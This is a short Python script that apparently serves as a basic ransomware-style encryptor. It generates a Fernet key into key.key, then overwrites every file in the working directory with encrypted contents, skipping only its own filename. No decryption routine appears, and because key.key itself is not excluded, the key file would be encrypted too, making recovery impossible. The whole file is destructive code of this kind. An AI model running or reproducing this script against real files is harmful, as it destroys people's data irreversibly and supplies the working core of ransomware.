import os

import cryptography
from cryptography.fernet import Fernet



key = ""
def generate_key():
        with open("key.key", "wb") as fkey:
            key = Fernet.generate_key()
            fkey.write(key)
            fkey.close()
            return key
def encrypt():
    with open("key.key", "rb") as keyfile:
        key = keyfile.read()


    for file in os.listdir():
        if file == "encryption.py":
            continue
        if os.path.isfile(file):
            with open(file, 'rb') as sfile:
                content = sfile.read()
                sfile.close()
            content_encrypted = Fernet(key).encrypt(content)

            with open(file, 'wb') as encrypted_file:
                encrypted_file.write(content_encrypted)




